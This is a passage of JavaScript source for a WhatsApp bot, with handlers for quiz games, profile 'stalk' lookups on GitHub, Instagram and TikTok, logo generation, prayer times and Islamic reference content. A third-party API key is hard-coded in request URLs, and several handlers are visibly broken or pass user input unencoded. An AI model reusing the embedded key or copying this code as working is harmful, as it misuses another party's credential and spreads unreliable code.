if (tebakkabupaten.hasOwnProperty(m.sender.split('@')[0])) return reply("There Are Still Unfinished Sessions!");
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkabupaten.json');
let result = anu[Math.floor(Math.random() * anu.length)];
ptz.sendImage(m.chat, result.url, `Silahkan Jawab Gambar Berikut\n\nWaktu : 60s`, m).then(() => {
tebakkabupaten[m.sender.split('@')[0]] = result.title.toLowerCase();
});
await sleep(60000);
if (tebakkabupaten.hasOwnProperty(m.sender.split('@')[0])) {
console.log("Answer " + result.title);
ptz.sendText(m.chat, `Time Out\nAnswer:  ${tebakkabupaten[m.sender.split('@')[0]]}`, m);
delete tebakkabupaten[m.sender.split('@')[0]];
}
} else if (args[0] === 'kimia') {
if (tebakkimia.hasOwnProperty(m.sender.split('@')[0])) return reply("There Are Still Unfinished Sessions!");
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkimia.json');
let result = anu[Math.floor(Math.random() * anu.length)];
ptz.sendText(m.chat, `Silahkan Jawab Pertanyaan Berikut\n\nUnsur : ${result.unsur}\nWaktu : 60s`, m).then(() => {
tebakkimia[m.sender.split('@')[0]] = result.lambang.toLowerCase();
});
await sleep(60000);
if (tebakkimia.hasOwnProperty(m.sender.split('@')[0])) {
console.log("Answer " + result.lambang);
ptz.sendText(m.chat, `Time Out\nAnswer:  ${tebakkimia[m.sender.split('@')[0]]}`, m);
delete tebakkimia[m.sender.split('@')[0]];
}
} else if (args[0] === 'asahotak') {
if (tebakasahotak.hasOwnProperty(m.sender.split('@')[0])) return reply("There Are Still Unfinished Sessions!");
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/asahotak.json');
let result = anu[Math.floor(Math.random() * anu.length)];
ptz.sendText(m.chat, `Please Answer Questions Following\n\nQuestion : ${result.soal}\nTime : 60s`, m).then(() => {
tebakasahotak[m.sender.split('@')[0]] = result.jawaban.toLowerCase();
});
await sleep(60000);
if (tebakasahotak.hasOwnProperty(m.sender.split('@')[0])) {
console.log("Answer: " + result.jawaban);
ptz.sendText(m.chat, `Time Out\nAnswer:  ${tebakasahotak[m.sender.split('@')[0]]}`, m);
delete tebakasahotak[m.sender.split('@')[0]];
}
} else if (args[0] === 'who am i') {
if (tebaksiapakahaku.hasOwnProperty(m.sender.split('@')[0])) return reply("There Are Still Unfinished Sessions!");
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/siapakahaku.json');
let result = anu[Math.floor(Math.random() * anu.length)];
ptz.sendText(m.chat, `Please Answer the Following Questions\n\nQuestions : ${result.soal}\nWaktu : 60s`, m).then(() => {
tebaksiapakahaku[m.sender.split('@')[0]] = result.jawaban.toLowerCase();
});
await sleep(60000);
if (tebaksiapakahaku.hasOwnProperty(m.sender.split('@')[0])) {
console.log("Answer " + result.jawaban);
ptz.sendText(m.chat, `Time Out\nAnswer:  ${tebaksiapakahaku[m.sender.split('@')[0]]}`, m);
delete tebaksiapakahaku[m.sender.split('@')[0]];
}
} else if (args[0] === 'susunkata') {
if (tebaksusunkata.hasOwnProperty(m.sender.split('@')[0])) return reply("There Are Still Unfinished Sessions!");
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/susunkata.json');
let result = anu[Math.floor(Math.random() * anu.length)];
ptz.sendText(m.chat, `Please Answer the Following Questions\n\nQuestions : ${result.soal}\nTipe : ${result.tipe}\nWaktu : 60s`, m).then(() => {
tebaksusunkata[m.sender.split('@')[0]] = result.jawaban.toLowerCase();
});
await sleep(60000);
if (tebaksusunkata.hasOwnProperty(m.sender.split('@')[0])) {
console.log("Answer " + result.jawaban);
ptz.sendText(m.chat, `Time Out\nAnswer:  ${tebaksusunkata[m.sender.split('@')[0]]}`, m);
delete tebaksusunkata[m.sender.split('@')[0]];
}
} else if (args[0] === 'tekateki') {
if (tebaktekateki.hasOwnProperty(m.sender.split('@')[0])) return reply("There Are Still Unfinished Sessions!");
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tekateki.json');
let result = anu[Math.floor(Math.random() * anu.length)];
ptz.sendText(m.chat, `Please Answer the Following Questions\n\nQuestions : ${result.soal}\nTime : 60s`, m).then(() => {
tebaktekateki[m.sender.split('@')[0]] = result.jawaban.toLowerCase();
});
await sleep(60000);
if (tebaktekateki.hasOwnProperty(m.sender.split('@')[0])) {
console.log("Answer " + result.jawaban);
ptz.sendText(m.chat, `Time Out\nAnswer:  ${tebaktekateki[m.sender.split('@')[0]]}`, m);
delete tebaktekateki[m.sender.split('@')[0]];
}
}
break
}
case 'afk':
if (!isGroup) return reply('Only Group')
if (isAfkOn) return reply("Brother Was AFK Before");
let reason = text ? text : 'Nothing.';
afk.addAfkUser(m.sender, Date.now(), reason, _afk);
reply(`@${m.sender.split('@')[0]} Currently AFK\nWith Reason : ${reason}`);
break

//==============//


case 'ghstalk': case 'githubstalk':{
reply('`Wait...`')
if (!q) return reply(`Example ${prefix+command} DeeCeeXxx`)
reply('`Processing...`') 
aj = await githubstalk.githubstalk(`${q}`)
ptz.sendMessage(m.chat, { image: { url : aj.profile_pic }, caption: 
`*/ Github Stalker \\*

Username : ${aj.username}
Nickname : ${aj.nickname}
Bio : ${aj.bio}
Id : ${aj.id}
Nodeid : ${aj.nodeId}
Url Profile : ${aj.profile_pic}
Url Github : ${aj.url}
Type : ${aj.type}
Admin : ${aj.admin}
Company : ${aj.company}
Blog : ${aj.blog}
Location : ${aj.location}
Email : ${aj.email}
Public Repo : ${aj.public_repo}
Public Gists : ${aj.public_gists}
Followers : ${aj.followers}
Following : ${aj.following}
Created At : ${aj.ceated_at}
Updated At : ${aj.updated_at}` }, { quoted: m } )
}
break

case 'instagramstalk':
case 'igstalk': {
if (!args[0]) return reply(`Enter Instagram Username\n\nExample: ${prefix + command} davidcyril02`)
const data = await fetchJson(`https://skizo.tech/api/igstalk?apikey=nanogembul&user=${encodeURIComponent(text)}`)
ptz.sendMessage(m.chat, { react: { text: '🕒', key: m.key }})
    try {
    let res = await fg.igStalk(args[0])
    let te = `
┌──「 *STALKING* 
▢ *🔖Name:* ${data.fullname} 
▢ *🔖Username:* ${data.username}
▢ *👥Follower:* ${data.followers}
▢ *🫂Following:* ${data.following}
▢ *📌Bio:* ${data.bio}
▢ *🏝️Posts:* ${data.posts}
▢ *🔗 Link* : https://instagram.com/${data.username.replace(/^@/, '')}
└────────────`
     await ptz.sendMessage(m.chat, {image: { url: data.photo_profile }, caption: te }, {quoted: m})
      } catch {
        reply(`Make sure the username comes from *Instagram*`)
      }
}
break
case 'tiktokstalk':
case 'ttstalk': {
if (!args[0]) return reply(`Input Tiktok Username\n\nExample: ${prefix + command} DeeCeeXxx`)
const respon = await fetchJson(`https://skizo.tech/api/ttstalk?apikey=nanogembul&user=${encodeURIComponent(text)}`)
ptz.sendMessage(m.chat, { react: { text: '🕒', key: m.key }})
try {
const data = respon.data.user
const data1 = respon.data.stats
    let res = await fg.igStalk(args[0])
    let te = `
┌──「 *STALKING* 
▢ *🔖Name:* ${data.nickname} 
▢ *🔖Username:* ${data.uniqueId}
▢ *👥Follower:* ${data1.followerCount}
▢ *🫂Following:* ${data1.followingCount}
▢ *📌Bio:* ${data.signature}
▢ *🏝️Posts:* ${data1.videoCount}
▢ *❣️Suka:* ${data1.heart}
▢ *🔗 Link* : https://tiktok.com/${data.uniqueId}
└────────────`
     await ptz.sendMessage(m.chat, {image: { url: data.avatarLarger }, caption: te }, {quoted: m})
      } catch {
        reply(`Make sure the username comes from *tiktok*`)
      }
}
break

case 'flaming1':{
if (args.length == 0) return reply(`Example: ${prefix + command} Teks`)


let ini_txt = args.join(" ")
var buffer = `https://flamingtext.com/net-fu/proxy_form.cgi?&imageoutput=true&script=fluffy-logo&script=fluffy-logo&fontsize=90&doScale=true&scaleWidth=800&scaleHeight=500&fontsize=100&fillTextColor=%23000&shadowGlowColor=%23000&backgroundColor=%23000&text=${ini_txt}`
ptz.sendMessage(from, { contextInfo: {externalAdReply: {showAdAttribution: true, title: `QUEEN_ANITA-V3`, mediaType: 3,  renderLargerThumbnail : true,thumbnail: fs.readFileSync('./thum.jpg'),sourceUrl: `https://wa.me/0`
}}, image: {url:buffer}, caption: `success`}, { quoted: m})
.catch((err) => reply('Server is having error please try again tomorrow!'))

}
break
 case 'flaming2':{

if (args.length == 0) return reply(`Example: ${prefix + command} Teks`)


let ini_txt = args.join(" ")
var buffer = `https://www6.flamingtext.com/net-fu/proxy_form.cgi?&imageoutput=true&script=fluffy-logo&doScale=true&scaleWidth=800&scaleHeight=500&fontsize=100&text=${ini_txt}`
ptz.sendMessage(from, { contextInfo: {externalAdReply: {showAdAttribution: true, title: `QUEEN_ANITA-V3`, mediaType: 3,  renderLargerThumbnail : true,thumbnail: fs.readFileSync('./thum.jpg'),sourceUrl: `https://wa.me/0`
}}, image: {url:buffer}, caption: `success`}, { quoted: m})
.catch((err) => reply('Server is having an error, please try again tomorrow!'))

}
break
case 'flaming3':{

if (args.length == 0) return reply(`Example: ${prefix + command} Teks`)


let ini_txt = args.join(" ")
var buffer = `https://www6.flamingtext.com/net-fu/proxy_form.cgi?&imageoutput=true&script=sketch-name&doScale=true&scaleWidth=800&scaleHeight=500&fontsize=100&fillTextType=1&fillTextPattern=Warning!&text=${ini_txt}`
ptz.sendMessage(from, { contextInfo: {externalAdReply: {showAdAttribution: true, title: `QUEEN_ANITA-V3`, mediaType: 3,  renderLargerThumbnail : true,thumbnail: fs.readFileSync('./thum.jpg') ,sourceUrl: `https://wa.me/0`
}}, image: {url:buffer}, caption: `success`}, { quoted: m})
.catch((err) => reply('Server is having an error, please try again tomorrow!'))

}
break
case 'flaming4':{

if (args.length == 0) return reply(`Example: ${prefix + command} Teks`)


let ini_txt = args.join(" ")
var buffer = `https://www6.flamingtext.com/net-fu/proxy_form.cgi?&imageoutput=true&script=sketch-name&doScale=true&scaleWidth=800&scaleHeight=500&fontsize=100&fillTextType=1&fillTextPattern=Warning!&fillColor1Color=%23f2aa4c&fillColor2Color=%23f2aa4c&fillColor3Color=%23f2aa4c&fillColor4Color=%23f2aa4c&fillColor5Color=%23f2aa4c&fillColor6Color=%23f2aa4c&fillColor7Color=%23f2aa4c&fillColor8Color=%23f2aa4c&fillColor9Color=%23f2aa4c&fillColor10Color=%23f2aa4c&fillOutlineColor=%23f2aa4c&fillOutline2Color=%23f2aa4c&backgroundColor=%23101820&text=${ini_txt}`
ptz.sendMessage(from, { contextInfo: {externalAdReply: {showAdAttribution: true, title: `QUEEN_ANITA-V3`, mediaType: 3,  renderLargerThumbnail : true,thumbnail: fs.readFileSync('./thum.jpg') ,sourceUrl: `https://wa.me/0`
}}, image: {url:buffer}, caption: `success`}, { quoted: m})
.catch((err) => reply('Server is having an error, please try again tomorrow!'))

}
break
case 'flaming5':{

if (args.length == 0) return reply(`Example: ${prefix + command} Teks`)


let ini_txt = args.join(" ")
var buffer = `https://flamingtext.com/net-fu/proxy_form.cgi?&imageoutput=true&script=water-logo&script=water-logo&fontsize=90&doScale=true&scaleWidth=800&scaleHeight=500&fontsize=100&fillTextColor=%23000&shadowGlowColor=%23000&backgroundColor=%23000&text=${ini_txt}`
ptz.sendMessage(from, { contextInfo: {externalAdReply: {showAdAttribution: true, title: `QUEEN_ANITA-V3`, mediaType: 3,  renderLargerThumbnail : true,thumbnail: fs.readFileSync('./thum.jpg') ,sourceUrl: `https://wa.me/0`
}}, image: {url:buffer}, caption: `success`}, { quoted: m})
.catch((err) => reply('Server is having an error, please try again tomorrow!'))

}
break

case 'listblock':{
if (!isCreator) return reply(`For My Owner Only`);
let block = await ptz.fetchBlocklist()
reply('List Block :\n\n' + `Total : ${block == undefined ? '*0* Blocked' : '*' + block.length + '* Blocked'}\n` + block.map(v => '• ' + v.replace(/@.+/, '')).join`\n`)
}
break
//=================================================//
case 'setppbot1':{
if (!isCreator) return reply(`For My Owner Only`);
if(m.quoted){
const media = await ptz.downloadAndSaveMediaMessage(quoted)
const { img } = await generateProfilePicture(media)
await ptz.query({ tag: 'iq',  attrs: { to: botNumber, type:'set', xmlns: 'w:profile:picture'}, content: [{ tag: 'picture', attrs: { type: 'image' }, content: img }]})   
await reply(`${mess.success}`)
} else reply("Reply fotonya")
}
break

case 'flaming6':{

if (args.length == 0) return reply(`Example: ${prefix + command} Teks`)


let ini_txt = args.join(" ")
var buffer = `https://www6.flamingtext.com/net-fu/proxy_form.cgi?&imageoutput=true&script=water-logo&doScale=true&scaleWidth=800&scaleHeight=500&fontsize=100&fillTextType=0&backgroundColor=%23101820&text=${ini_txt}`
ptz.sendMessage(from, { contextInfo: {externalAdReply: {showAdAttribution: true, title: `QUEEN_ANITA-V3`, mediaType: 3,  renderLargerThumbnail : true,thumbnail: fs.readFileSync('./thum.jpg'),sourceUrl: `https://wa.me/0`
}}, image: {url:buffer}, caption: `success`}, { quoted: m})
.catch((err) => reply('Server is having an error, please try again tomorrow!'))

}
break        

        case "battle": {
if (!text) return reply("Enter the number you want to battle with")
const pitaj  = `${text}@s.whatsapp.net` 
 challengeBattle(m.sender, pitaj);
}
break
case "acc-battle": {
 acceptBattle(m.sender);

const challengerId = battleRequests[senderId];
        if (response.includes('Challenge accepted')) {
    startBattle(challengerId, m.sender);
                   
        }
}
break

case "rejec-battle": {
  cancelBattle(m.sender);
}
break
       
case "yeahnostory":
reply ("QUEEN_ANITA-V3 Huh?, Ok I send digimon for you, but..")

setTimeout( () => {
reply(`QUEEN_ANITA-V3 are you like David Cyril ?, Him is Dev !`)
}, 1200) 
reply("QUEEN_ANITA-V3 Sorry, I talk about you.. ,Allright I Give you digimon")
await sleep(4000)
reply("QUEEN_ANITA-V3 What are you waiting for digimon?")
setTimeout( () => {
reply(`QUEEN_ANITA-V3 here there is nothing, please try again later.. `)
}, 1200) 
    break
    
    case "yeahnedstory":
reply ("QUEEN_ANITA-V3 Woah, You real Like it ?, My Dev Like digimon, Umm.. You like ?")
setTimeout( () => {
reply(`QUEEN_ANITA-V3 What You repeat .getdigi or .getdigimon ?, sorry I too negative_`)
}, 1200) 
reply("QUEEN_ANITA-V3 answer this, yeah..")
await sleep(2000)
let mseeeeeee = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 "messageContextInfo": {
 "deviceListMetadata": {},
 "deviceListMetadataVersion": 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.create({
 contextInfo: {
 	mentionedJid: [m.sender], 
 	isForwarded: true, 
	 forwardedNewsletterMessageInfo: {
			newsletterJid: '12036326753395844@newsletter',
			newsletterName: '>>>  YOU QUESTION <<<', 
			serverMessageId: -1
		},
	businessMessageForwardInfo: { businessOwnerJid: ptz.decodeJid(ptz.user.id) },
 externalAdReply: { 
 title: '?????', 
 thumbnailUrl: 'https://imgur.com/a/PD8nT5X', 
 sourceUrl: '',
 mediaType: 2,
 renderLargerThumbnail: false
 }
 }, 
 body: proto.Message.InteractiveMessage.Body.create({
 text: ` you like digimon?`
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
 text: ``
 }),
 header: proto.Message.InteractiveMessage.Header.create({
 title: ``,
 subtitle: "???",
 hasMediaAttachment: false//...(await prepareWAMessageMedia({ image: { url: 'https://imgur.com/a/PD8nT5X' } }, { upload: ptz.waUploadToServer }))
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 buttons: [ {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"No","id": ".bodigistory"}`
                },
                 {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Yes","id": ".godigistory"}`
                },
 ],
 })
 })
 }
 }
}, {})

await ptz.relayMessage(mseeeeeee.key.remoteJid, mseeeeeee.message, {
 messageId: mseeeeeee.key.id
})

break

case "godigistory":
reply("QUEEN_ANITA-V3 Hihi, You like me !, Thaks, I'm like you. ( Ini cuman story )")
await sleep(1000)
reply("QUEEN_ANITA-V3 Lest Go ! , I'm Give You perfect digimon.")
await sleep(1000)
gettingye()
break


case "bodigistory":
reply(`QUEEN_ANITA-V3 Why, You Liked Digimon right? is joke, How..`)
await sleep(1200)
let mseeeeeeee = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 "messageContextInfo": {
 "deviceListMetadata": {},
 "deviceListMetadataVersion": 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.create({
 contextInfo: {
 	mentionedJid: [m.sender], 
 	isForwarded: true, 
	 forwardedNewsletterMessageInfo: {
			newsletterJid: '12036326753395844@newsletter',
			newsletterName: '>>>  YOU QUESTION <<<', 
			serverMessageId: -1
		},
	businessMessageForwardInfo: { businessOwnerJid: ptz.decodeJid(ptz.user.id) },
 externalAdReply: { 
 title: '?????', 
 thumbnailUrl: 'https://imgur.com/a/PD8nT5X', 
 sourceUrl: '',
 mediaType: 2,
 renderLargerThumbnail: false
 }
 }, 
 body: proto.Message.InteractiveMessage.Body.create({
 text: `Ummm.... ?`
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
 text: ``
 }),
 header: proto.Message.InteractiveMessage.Header.create({
 title: ``,
 subtitle: "???",
 hasMediaAttachment: false//...(await prepareWAMessageMedia({ image: { url: 'https://imgur.com/a/PD8nT5X' } }, { upload: ptz.waUploadToServer }))
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 buttons: [ {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Yeah, that Joke","id": ".lanjutinstory"}`
                },
                {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"I Really","id": ".reallystory"}`
                },
 ],
 })
 })
 }
 }
}, {})

await ptz.relayMessage(mseeeeeeee.key.remoteJid, mseeeeeeee.message, {
 messageId: mseeeeeeee.key.id
})


break

case "lanjutinstory":
reply("QUEEN_ANITA-V3 Hihi, that funny :D, Ok I'm Give you digimon, this best digimon for you.")
await sleep(1000)
gettingye()
break

case "reallystory":
reply("QUEEN_ANITA-V3 What Are you About Talk !")
await sleep(1200)
reply("QUEEN_ANITA-V3 I'm No give companion digimon for you !")
await sleep(1000)
reply("QUEEN_ANITA-V3 bye.")
break

//=================================// SILAMI, ku segel biar bagus 
        case "jadwalsholat": case "sholat":
try {
if (text === "") {
let data = await (await fetch("https://api.aladhan.com/v1/timingsByCity?city=Makassar&country=Indonesia&method=8")).json();
   let jadwalSholatMakasar = data.data.timings


Subuh = data.data.timings.Fajr

Dhuhr = data.data.timings.Dhuhr
 
Magrib =  data.data.timings.Maghrib

Isha = data.data.timings.Isha

Asar = data.data.timings.Asr

reply (`
*${m2}[ - J A D W A L - ]${m2}*

• *Dhuhr:* ${Dhuhr} 
• *Asr*: ${Asar}
-
• *Maghrib:* ${Magrib}
-
• *Isha:* ${Isha}
• *Subuh:* ${Subuh}

#makassar

*Note:* 

_Kamu bisa Lihat Timings Di kota Lain, Example: .jadwalsholat Yogyakarta_
`)
} else if (text === `${text}`) {
let data = await (await fetch(`https://api.aladhan.com/v1/timingsByCity?city=${text}&country=Indonesia&method=8`)).json();
   let jadwalSholatMakasar = data.data.timings


Subuh = data.data.timings.Fajr

Dhuhr = data.data.timings.Dhuhr
 
Magrib =  data.data.timings.Maghrib
Asar = data.data.timings.Asr
Isha = data.data.timings.Isha
reply (`
*${m2}[ - J A D W A L - ]${m2}*

• *Dhuhr:* ${Dhuhr} 
• *Asr*: ${Asar}
-
• *Maghrib:* ${Magrib}
-
• *Isha:* ${Isha}
• *Subuh:* ${Subuh}

#${text}

*Note:* 

_You bisa Lihat Timings Di kota Lain, Example: .jadwalsholat Yogyakarta_
`)
}
} catch(err) {
reply("Web Error Coba lagi Dengan Kota Yg Berbeda.")
}
break

case 'kisahnabi': {
if (!text) return reply(`Input nama nabi\nExample: kisahnabi adam`)
let url = await fetch(`https://raw.githubusercontent.com/ZeroChanBot/Api-Freee/a9da6483809a1fbf164cdf1dfbfc6a17f2814577/data/kisahNabi/${text}.json`)
let kisah = await url.json().catch(_ => "Error")
if (kisah == "Error") return reply("*Not Found*")

let hasil = `*👳 Nabi :* ${kisah.name}
*- Date of birth :* ${kisah.thn_kelahiran}
*- Place of birth :* ${kisah.tmp}
*- Age :* ${kisah.usia}

*— — — — — — ${m2}[ K I S A H ]${m2} — — — — — —*

${kisah.description}`

reply(`${hasil}`)

}
break

case 'asmaulhusna': {
const Example = `*Asmaul Husna*`
const anjuran = `
Dari Abu hurarirah radhiallahu anhu, Rasulullah Saw bersabda: "إِنَّ لِلَّهِ تَعَالَى تِسْعَةً وَتِسْعِينَ اسْمًا، مِائَةٌ إِلَّا وَاحِدًا، مَنْ أَحْصَاهَا دخل الجنة، وهو وتر يُحِبُّ الْوِتْرَ"
Artinya: "Sesungguhnya Allah mempunyai sembilan puluh sembilan nama, alias seratus kurang satu. Barang siapa yang menghitung-hitungnya, niscaya masuk surga; Dia Witir dan menyukai yang witir".`
const asmaulhusna = [
{
index: 1,
latin: "Ar Rahman",
arabic: "الرَّحْمَنُ",
translation_id: "Yang Memiliki Mutlak sifat Pemurah",
translation_en: "The All Beneficent"
},
{
index: 2,
latin: "Ar Rahiim",
arabic: "الرَّحِيمُ",
translation_id: "Yang Memiliki Mutlak sifat Penyayang",
translation_en: "The Most Merciful"
},
{
index: 3,
latin: "Al Malik",
arabic: "الْمَلِكُ",
translation_id: "Yang Memiliki Mutlak sifat Merajai/Memerintah",
translation_en: "The King, The Sovereign"
},
{
index: 4,
latin: "Al Quddus",
arabic: "الْقُدُّوسُ",
translation_id: "Yang Memiliki Mutlak sifat Suci",
translation_en: "The Most Holy"
},
{
index: 5,
latin: "As Salaam",
arabic: "السَّلاَمُ",
translation_id: "Yang Memiliki Mutlak sifat Memberi Kesejahteraan",
translation_en: "Peace and Blessing"
},
{
index: 6,
latin: "Al Mu’min",
arabic: "الْمُؤْمِنُ",
translation_id: "Yang Memiliki Mutlak sifat Memberi Keamanan",
translation_en: "The Guarantor"
},
{
index: 7,
latin: "Al Muhaimin",
arabic: "الْمُهَيْمِنُ",
translation_id: "Yang Memiliki Mutlak sifat Pemelihara",
translation_en: "The Guardian, the Preserver"
},
{
index: 8,
latin: "Al ‘Aziiz",
arabic: "الْعَزِيزُ",
translation_id: "Yang Memiliki Mutlak Kegagahan",
translation_en: "The Almighty, the Self Sufficient"
},
{
index: 9,
latin: "Al Jabbar",
arabic: "الْجَبَّارُ",
translation_id: "Yang Memiliki Mutlak sifat Perkasa",
translation_en: "The Powerful, the Irresistible"
},
{
index: 10,
latin: "Al Mutakabbir",
arabic: "الْمُتَكَبِّرُ",
translation_id: "Yang Memiliki Mutlak sifat Megah,Yang Memiliki Kebesaran",
translation_en: "The Tremendous"
},
{
index: 11,
latin: "Al Khaliq",
arabic: "الْخَالِقُ",
translation_id: "Yang Memiliki Mutlak sifat Pencipta",
translation_en: "The Creator"
},
{
index: 12,
latin: "Al Baari’",
arabic: "الْبَارِئُ",
translation_id: "Yang Memiliki Mutlak sifat Yang Melepaskan(Membuat, Membentuk, Menyeimbangkan)",
translation_en: "The Maker"
},
{
index: 13,
latin: "Al Mushawwir",
arabic: "الْمُصَوِّرُ",
translation_id: "Yang Memiliki Mutlak sifat YangMembentuk Rupa (makhluknya)",
translation_en: "The Fashioner of Forms"
},
{
index: 14,
latin: "Al Ghaffaar",
arabic: "الْغَفَّارُ",
translation_id: "Yang Memiliki Mutlak sifat Pengampun",
translation_en: "The Ever Forgiving"
},
{
index: 15,
latin: "Al Qahhaar",
arabic: "الْقَهَّارُ",
translation_id: "Yang Memiliki Mutlak sifat Memaksa",
translation_en: "The All Compelling Subduer"
},
{
index: 16,
latin: "Al Wahhaab",
arabic: "الْوَهَّابُ",
translation_id: "Yang Memiliki Mutlak sifat Pemberi Karunia",
translation_en: "The Bestower"
},
{
index: 17,
latin: "Ar Razzaaq",
arabic: "الرَّزَّاقُ",
translation_id: "Yang Memiliki Mutlak sifat Pemberi Rejeki",
translation_en: "The Ever Providing"
},
{
index: 18,
latin: "Al Fattaah",
arabic: "الْفَتَّاحُ",
translation_id: "Yang Memiliki Mutlak sifat Pembuka Rahmat",
translation_en: "The Opener, the Victory Giver"
},
{
index: 19,
latin: "Al ‘Aliim",
arabic: "اَلْعَلِيْمُ",
translation_id: "Yang Memiliki Mutlak sifatMengetahui (Memiliki Ilmu)",
translation_en: "The All Knowing, the Omniscient"
},
{
index: 20,
latin: "Al Qaabidh",
arabic: "الْقَابِضُ",
translation_id: "Yang Memiliki Mutlak sifat YangMenyempitkan (makhluknya)",
translation_en: "The Restrainer, the Straightener"
},
{
index: 21,
latin: "Al Baasith",
arabic: "الْبَاسِطُ",
translation_id: "Yang Memiliki Mutlak sifat YangMelapangkan (makhluknya)",
translation_en: "The Expander, the Munificent"
},
{
index: 22,
latin: "Al Khaafidh",
arabic: "الْخَافِضُ",
translation_id: "Yang Memiliki Mutlak sifat YangMerendahkan (makhluknya)",
translation_en: "The Abaser"
},
{
index: 23,
latin: "Ar Raafi’",
arabic: "الرَّافِعُ",
translation_id: "Yang Memiliki Mutlak sifat YangMeninggikan (makhluknya)",
translation_en: "The Exalter"
},
{
index: 24,
latin: "Al Mu’izz",
arabic: "الْمُعِزُّ",
translation_id: "Yang Memiliki Mutlak sifat YangMemuliakan (makhluknya)",
translation_en: "The Giver of Honor"
},
{
index: 25,
latin: "Al Mudzil",
arabic: "المُذِلُّ",
translation_id: "Yang Memiliki Mutlak sifatYang Menghinakan (makhluknya)",
translation_en: "The Giver of Dishonor"
},
{
index: 26,
latin: "Al Samii’",
arabic: "السَّمِيعُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Mendengar",
translation_en: "The All Hearing"
},
{
index: 27,
latin: "Al Bashiir",
arabic: "الْبَصِيرُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Melihat",
translation_en: "The All Seeing"
},
{
index: 28,
latin: "Al Hakam",
arabic: "الْحَكَمُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Menetapkan",
translation_en: "The Judge, the Arbitrator"
},
{
index: 29,
latin: "Al ‘Adl",
arabic: "الْعَدْلُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Adil",
translation_en: "The Utterly Just"
},
{
index: 30,
latin: "Al Lathiif",
arabic: "اللَّطِيفُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Lembut",
translation_en: "The Subtly Kind"
},
{
index: 31,
latin: "Al Khabiir",
arabic: "الْخَبِيرُ",
translation_id: "Yang Memiliki Mutlak sifatMaha Mengetahui Rahasia",
translation_en: "The All Aware"
},
{
index: 32,
latin: "Al Haliim",
arabic: "الْحَلِيمُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Penyantun",
translation_en: "The Forbearing, the Indulgent"
},
{
index: 33,
latin: "Al ‘Azhiim",
arabic: "الْعَظِيمُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Agung",
translation_en: "The Magnificent, the Infinite"
},
{
index: 34,
latin: "Al Ghafuur",
arabic: "الْغَفُورُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Pengampun",
translation_en: "The All Forgiving"
},
{
index: 35,
latin: "As Syakuur",
arabic: "الشَّكُورُ",
translation_id: "Yang Memiliki Mutlak sifat MahaPembalas Budi (Menghargai)",
translation_en: "The Grateful"
},
{
index: 36,
latin: "Al ‘Aliy",
arabic: "الْعَلِيُّ",
translation_id: "Yang Memiliki Mutlak sifat Maha Tinggi",
translation_en: "The Sublimely Exalted"
},
{
index: 37,
latin: "Al Kabiir",
arabic: "الْكَبِيرُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Besar",
translation_en: "The Great"
},
{
index: 38,
latin: "Al Hafizh",
arabic: "الْحَفِيظُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Menjaga",
translation_en: "The Preserver"
},
{
index: 39,
latin: "Al Muqiit",
arabic: "المُقيِت",
translation_id: "Yang Memiliki Mutlak sifat Maha Pemberi Kecukupan",
translation_en: "The Nourisher"
},
{
index: 40,
latin: "Al Hasiib",
arabic: "الْحسِيبُ",
translation_id: "Yang Memiliki Mutlak sifat MahaMembuat Perhitungan",
translation_en: "The Reckoner"
},
{
index: 41,
latin: "Al Jaliil",
arabic: "الْجَلِيلُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Mulia",
translation_en: "The Majestic"
},
{
index: 42,
latin: "Al Kariim",
arabic: "الْكَرِيمُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Pemurah",
translation_en: "The Bountiful, the Generous"
},
{
index: 43,
latin: "Ar Raqiib",
arabic: "الرَّقِيبُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Mengawasi",
translation_en: "The Watchful"
},
{
index: 44,
latin: "Al Mujiib",
arabic: "الْمُجِيبُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Mengabulkan",
translation_en: "The Responsive, the Answerer"
},
{
index: 45,
latin: "Al Waasi’",
arabic: "الْوَاسِعُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Luas",
translation_en: "The Vast, the All Encompassing"
},
{
index: 46,
latin: "Al Hakiim",
arabic: "الْحَكِيمُ",
translation_id: "Yang Memiliki Mutlak sifat Maka Bijaksana",
translation_en: "The Wise"
},
{
index: 47,
latin: "Al Waduud",
arabic: "الْوَدُودُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Pencinta",
translation_en: "The Loving, the Kind One"
},
{
index: 48,
latin: "Al Majiid",
arabic: "الْمَجِيدُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Mulia",
translation_en: "The All Glorious"
},
{
index: 49,
latin: "Al Baa’its",
arabic: "الْبَاعِثُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Membangkitkan",
translation_en: "The Raiser of the Dead"
},
{
index: 50,
latin: "As Syahiid",
arabic: "الشَّهِيدُ",
